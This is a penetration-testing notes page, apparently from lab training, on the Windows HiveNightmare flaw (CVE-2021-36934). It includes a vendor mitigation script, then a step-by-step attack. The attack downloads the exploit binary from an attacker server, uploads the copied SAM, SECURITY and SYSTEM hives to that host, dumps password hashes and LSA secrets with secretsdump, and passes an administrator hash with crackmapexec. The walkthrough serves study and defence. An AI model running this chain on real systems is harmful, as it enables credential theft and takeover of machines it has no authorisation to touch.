---
title: HiveNightmare- aka SeriosSam (CVE-2021-36934)
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
---
# 🐝 HiveNightmare, aka SeriosSam (CVE-2021-36934)

!!! tip "Kernel exploits"
	- [Windows kernel exploits](windows-kernel-exploits.md)
	- [Linux kernel exploits](linux-kernel-exploits.md)


`CVE-2021-36934 HiveNightmare, aka SeriousSam` is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py. More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe) exploit binary can be used to create copies of the three files to our working directory. 


The following [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue. Let's take a look.

```
# Fix HiveNightmare ACLs and snapshots
# v1.0

# Originally by unknown and adapted by @doctormay6 and @GossiTheDog

# Schedule to run as SYSTEM in a deployment tool, test locally first
# Do not run on Windows Server in case you use VSS for backups

#change permissions and delete shadows
$checkPermissions = icacls c:\Windows\System32\config\sam
if ($checkPermissions -like '*BUILTIN\Users:(I)(RX*)*') {
    icacls c:\windows\system32\config\*.* /inheritance:e
    vssadmin delete shadows /quiet /all
    $vulnerable = $true
}
else {
    $vulnerable = $false
}

 

#check permissions
if ($vulnerable -eq $true) {
    $checkPermissions = icacls C:\windows\system32\config\sam
    if ($checkPermissions -like '*BUILTIN\Users:(I)(RX*)*') {
        $permissionsSucces = $false
        write-host "ACL change failed. Check permissions running script, e.g. run as SYSTEM."
    }
    else {
        $permissionsSucces = $true
        Write-Host "Successfully reset permission inheritance on affected files."
    }
}

 

#check shadow
if ($vulnerable -eq $true) {
    $checkShadow = Get-WmiObject Win32_ShadowStorage -Property UsedSpace | Select-Object -ExpandProperty UsedSpace
    if (0 -eq $checkShadow) {
        $shadowSucces = $true
        Write-Host "Successfully deleted old volume shadow copies."
    }
    else {
        $shadowSucces = $false
        write-host "Shadow deletion failed. Security software may be blocking this action or check running permissions."
    }
}

 

#check if fixed logic
if ($vulnerable -eq $true) {
    if ($permissionsSucces -eq $true -and $shadowSucces -eq $true) {
        $fixed = $true
    }
    else {
        $fixed = $false
    }
}
else {
    $fixed = 'Not applicable'
}

 

#create new shadow
if ($vulnerable -eq $true -and $shadowSucces -eq $true -and $permissionsSucces -eq $true) {
    wmic shadowcopy call create Volume='C:\'
    Write-Host ""
}

 

#output data
write-host "vulnerable: $vulnerable"
write-host "Fixed: $fixed"
```


## Checking Permissions on the SAM File

We can check for this vulnerability using icacls to check permissions on the SAM file. 

```cmd-session
icacls c:\Windows\System32\config\SAM
```

Output:

```
C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

In our case, we have a vulnerable version as the file is readable by the BUILTIN\Users group.

Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have System Protection enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.

## Performing Attack and Parsing Password Hashes

We will use the POC `https://github.com/GossiTheDog/HiveNightmare`.

```bash
git clone https://github.com/GossiTheDog/HiveNightmare.git
cd HiveNightmare/Release
python3 -m http.server 8080
```

From the target host:

```
curl http://10.10.14.158:8080/HiveNightmare.exe -O "C:\Tools\HiveNightmare.exe"      
```

And now:

```powershell 
.\HiveNightmare.exe
```

This will create these copies:

```
65536 SAM-2021-08-09
32768 SECURITY-2021-08-09
12582912 SYSTEM-2021-08-09
```

Now, we can transfer them yo our attacking machine, for instance by using the PSUpload.ps1 script:

```powershell
<#

PowerShell Script to upload files using uploadserver module 
Github: https://github.com/Densaugeo/uploadserver

To execute the server run in your Linux Machine:
pip3 install uploadserver
python3 -m uploadserver

Example PS:
Invoke-FileUpload -File C:\Users\plaintext\Desktop\20200717080254_BloodHound.zip -Uri http://192.168.49.128:8000/upload

References: https://gist.github.com/arichika/91a8b1f60c87512401e320a614099283

#>

function Invoke-FileUpload {
	Param (
		[Parameter(Position = 0, Mandatory = $True)]
		[String]$File,
		
		[Parameter(Position = 1, Mandatory = $True)]
		[String]$Uri
		)
	
	$FileToUpload = Get-ChildItem -File "$File"
	
	$UTF8woBOM = New-Object "System.Text.UTF8Encoding" -ArgumentList @($false)
	$boundary = '----BCA246E0-E2CF-48ED-AACE-58B35D68B513'
	$tempFile = New-TemporaryFile
	Remove-Item $tempFile -Force -ErrorAction Ignore
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$fileName = [System.IO.Path]::GetFileName($FileToUpload.FullName)
	$sw.Write("--$boundary`r`nContent-Disposition: form-data;name=`"files`";filename=`"$fileName`"`r`n`r`n")
	$sw.Close()
	$fs = New-Object System.IO.FileStream($tempFile, [System.IO.FileMode]::Append)
	$bw = New-Object System.IO.BinaryWriter($fs)
	$fileBinary = [System.IO.File]::ReadAllBytes($FileToUpload.FullName)
	$bw.Write($fileBinary)
	$bw.Close()
	$sw = New-Object System.IO.StreamWriter($tempFile, $true, $UTF8woBOM)
	$sw.Write("`r`n--$boundary--`r`n")
	$sw.Close()
	
	Invoke-RestMethod -Method POST -Uri $uri -ContentType "multipart/form-data; boundary=$boundary" -InFile $tempFile
	
	$FileHash = Get-FileHash -Path "$File" -Algorith MD5 
	Write-Host "[+] File Uploaded: " $FileToUpload.FullName
	Write-Host "[+] FileHash: " $FileHash.Hash
}                                

```

By default, Windows prevents running `.ps1` scripts for security reasons unless explicitly allowed.

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

Then:

```powershell
. .\PSUpload.ps1
```

Now in the attacker machine:

```
python -m uploadserver
```

This will create a listening server at port 8000.

And from the target host:

```
Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SAM-2021-08-09"
Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SECURITY-2021-08-09"
Invoke-FileUpload -Uri http://10.10.14.158:8000/upload -File "C:\Tools\SYSTEM-2021-08-09"
```

Now we can use  impacket-secretsdump to extract the hashes:

```shell-session
secretsdump.py -sam SAM-2021-08-09 -system SYSTEM-2021-08-09 -security SECURITY-2021-08-09 local
```

And the output:

```
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[*] Target system bootKey: 0xebb2121de07ed08fc7dc58aa773b23d6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
hacker:1003:aad3b435b51404eeaad3b435b51404ee:657cc99ace25cc19c7d2902f26fb826d:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3c7b7e66890fb2181a74bb56ab12195f248e9461
dpapi_userkey:0xc3e6491e75d7cffe8efd40df94d83cba51832a56
[*] NL$KM 
 0000   45 C5 B2 32 29 8B 05 B8  E7 E7 E0 4B 2C 14 83 02   E..2)......K,...
 0010   CE 2F E7 D9 B8 E0 F0 F8  20 C8 E4 70 DD D1 7F 4F   ./...... ..p...O
 0020   42 2C E6 9E AF 57 74 01  09 88 B3 78 17 3F 88 54   B,...Wt....x.?.T
 0030   52 8F 8D 9C 06 36 C0 24  43 B9 D8 0F 35 88 B9 60   R....6.$C...5..`
NL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960
[*] Cleaning up... 
```

Now we can use other tools for continuing the exploitation. For instance:

```
crackmapexec smb  10.129.43.13 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL --sam  
```

